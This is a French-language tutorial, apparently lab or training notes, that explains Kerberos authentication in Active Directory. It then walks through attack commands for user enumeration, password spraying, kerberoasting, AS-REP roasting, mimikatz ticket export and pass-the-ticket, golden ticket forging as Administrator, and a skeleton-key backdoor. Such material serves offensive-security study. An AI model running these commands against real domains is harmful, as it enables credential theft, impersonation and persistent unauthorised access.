## 1) Le fonctionnement de Kerberos

Tout d'abord, Kerberos est le service d'authentification par défaut pour les domaines Microsoft Windows. Il a pour objectif d'être plus sécurisé que NTLM en utilisant le système ticket d'autorisation d'une 3e entité. De plus, l'algorithme de chiffrement y est renforcé.

Voici quelques termes à connaitre :

- **Ticket Granting Ticket (TGT)** : C'est un ticket d'authentification utilisé pour les requêtes des tickets de service provenant du TGS pour une ressource spécifique du domaine.
- **Ticket Granting Service (TGS)** : Ce ticket prend le TGT et le ticket dans une machine du domaine.
- **Key Distribution Center (KDC)** : Le KDC est un service qui accorde les TGT et les TGS qui proviennent de l'AS et du TGS.
- **Authentication Service (AS)** : Le service d'authentification détient les TGT qui seront utilisés par le TGS dans le domaine pour demander l'accès à d'autres machines et au TGS.
- **Service Principal Name (SPN)** : C'est un identifiant donné à un service pour associer ce service avec un compte d'un service de domaine.
- **KDC Long Term Secret Key (KDC LT Key)** : Cette clé est basé sur le compte service KRBTGT. Elle est utilisée pour chiffré le TGT et signé le PAC.
- **Client Long Term Secret Key (Client LT Key)** : Cette clé est basé sur le compte de l'ordinateur ou du service. Elle est utilisée pour vérifier le timestamp chiffré et chiffré la clé de session.
- **Service Long Term Secret Key (Service LT Key)** : Cette clé est basé sur le compte service. Elle est utilisée pour chiffré la portion Service du ticket de service et signé le PAC.
- **Privilege Attribute Certificate (PAC)** : Il garde toutes les informations pertinentes des utilisateurs, il est envoyé en même tempsque le TGT au KDC pour être signé par la KDC LT Key et soit le Client LT Key soit le Service LT Key.
- **Session Key** : Cette clé est utilisée pour accéder aux services.

Pour mieux comprendre l'ordre pour accéder à une ressource via Kerberos :

![Kerberos](https://i.imgur.com/VRr2B6w.png)

1. (AS-REQ) Le client envoie une requête au KDC pour avoir un TGT ou un ticket d'authentification
2. (AS-REP) Le KDC vérifie que le client existe et renvoie le TGT chiffré avec la clé de session
3. (TGS-REQ) Le client envoie le TGT chiffré au TGS avec le SPN du service que le client veut accéder
4. (TGS-RES) Le KDC vérifie le TGT de l'utilisateur et que celui-ci a la permission d'accéder au service, ensuite il envoie une clé de session valide pour le service
5. (AP-REQ) Le client envoie une requête au service et sa clé de session pour prouver son accès
6. (AP-REP) Le service lui autorise l'accès

## 2) Enumérer des utilisateurs valides au sein d'un AD

Pour ce faire, on va utiliser l'outil **[kerbrute](https://github.com/ropnop/kerbrute)** qui permet de faire cette action en abusant de la pre-authentification de Kerberos.

La commande a utilisé est la suivante :

```bash
kerbrute userenum --dc <Nom du domaine Controller> -d <Nom du domaine> <wordlist>
```

## 3) Récolter et brute-force/password-spraying les tickets

On utilsera pour ce faire, l'outil **[Rubeus](https://github.com/GhostPack/Rubeus)**. (le programme doit être sur la machine victime)

On peut récolter les différents tickets avec la commande suivante :

```powershell
Rubeus.exe harvest /interval:30
```

On a défini le mode de Rubeus sur harvest pour récolter les tickets à une intervalle de 30s.

Pour tester un mot de passe sur plusieurs machines à la fois, on va utilisé ceci :

```powershell
Rubeus.exe brute /password:Password1 /noticket
```

## 4) Kerberoasting

Cette attaque permet à un utilisateur d'envoyer une requête pour avoir un ticket de service pour tous les services avec un SPN enregistré et ensuite utilisé ce ticket pour cracker le mot de passe du service. Donc si le service a un SPN enregistré, il peut être Kerberoastable. Le succès de l'attaque dépend du niveau de sécurité du mot de passe.

Pour énumérer les compte Kerberoastable, on utilisera l'outil BloodHound ou Rubeus.

Pour ce faire avec Rubeus :

```powershell
Rubeus.exe kerberoast
```

Après avoir cracker le mot de passe du service, il y a plusieurs façon d'exfiltrer les données dépendant de si le service est dans un domain admin ou pas. 

Pour empêcher cette attaque, il faut :

- Avoir des mots de passes fort
- Ne pas créer de compte de service dans un domain admin

## 5) AS-REP Roasting

Cette attaque est très similaire à la précédente, elle va permettre d'avoir accès aux hash des comptes utilisateurs ayant la pre-authentification de Kerberos désactiver.

Pour ce faire avec Rubeus :

```powershell
Rubeus.exe asreproast
```

On crackera ensuite les hashs avec hashcat.

## 6) Pass the ticket

Cette attaque fonctionne en accèdant au TGT grâce à la mémoire LSASS (Local Security Authority Subsystem) de la machine. Le LSASS est un processus mémoire qui stocke les données sur un AD et peut stocker les tickets Kerberos avec ces données.

On utilisera l'outil **[mimikatz](https://github.com/ParrotSec/mimikatz)** pour ce faire :

```powershell
mimikatz.exe
```

```powershell
privilege::debug
```

Permet de savoir si l'on dispose des droits administrateurs pour le bon fonctionnement du script.

```powershell
sekurlsa::tickets /export
```

Permet d'exporter les tickets dans le répertoire courant.

```powershell
kerberos::ptt <ticket>
```

Cette commande permettra d'utiliser le ticket spécifier et donc de se faire passer pour la personne.

## 7) Golden/Silver Tickets

Tout d'abord, vous devez savoir la différence entre KRBTGT et TGT. Le KRBTGT est un compte de service pour le KDC, si l'on arrive a devenir le KRBTGT et que l'on crée un golden ticket, on se donne la possibilité de créer un ticket pour n'importe quelle service.

Comme l'étape précédente, on utilise mimikatz :

```powershell
lsadump::lsa /inject /name:krbtgt
```

Ensuite pour crée notre ticket et devenir Administrator :

```powershell
Kerberos::golden /user:Administrator /domain:controller.local /sid:<sid> /krbtgt:<hash> /id:<id>
```

Ensuite pour accéder à une machine avec ce ticket :

```powershell
misc::cmd
```

Cela créera un nouvel invité de commande avec des priviléges d'administrateurs.

## 8) Skeleton Key

Pour maintenir l'accès à notre machine, on utilisera l'attaque suivante. Cette Skeleton Key abuse sur la façon que l'AS-REQ valide les timestamp chiffrés. Cette clé n'est valable qu'avec l'algorithme de chiffrement RC4.

Il suffit juste de faire la commande suivante dans mimikatz :

```powershell
misc::skeleton
```

ensuite voici divers exemples :

```powershell
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```

```powershell
dir \\Desktop-1\c$ /user:Machine1 mimikatz
```

mimikatz étant le mot de passe par défaut de la clé.